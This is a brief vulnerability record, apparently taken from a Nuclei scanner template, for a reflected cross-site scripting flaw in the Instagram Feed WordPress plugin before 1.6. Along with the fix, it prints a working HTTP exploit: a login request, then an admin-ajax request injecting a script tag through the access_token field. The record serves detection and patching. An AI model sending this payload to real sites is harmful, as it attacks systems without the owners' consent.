# Vulnerability: Instagram Feed < 1.6 - Cross-Site Scripting
**Classification:** WORDPRESS
**Source:** Nuclei Template (`wp-instagram-feed-xss.yaml`)

## Description
The Instagram Feed WordPress plugin before 1.6 contains a reflected cross-site scripting (XSS) vulnerability due to improper sanitization of user-supplied input, allowing attackers to inject malicious scripts via crafted requests.

## Secure Mitigation
Update to version 1.6 or later.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

action=sbi_auto_save_tokens&access_token=<script>alert(document.domain)</script>
```

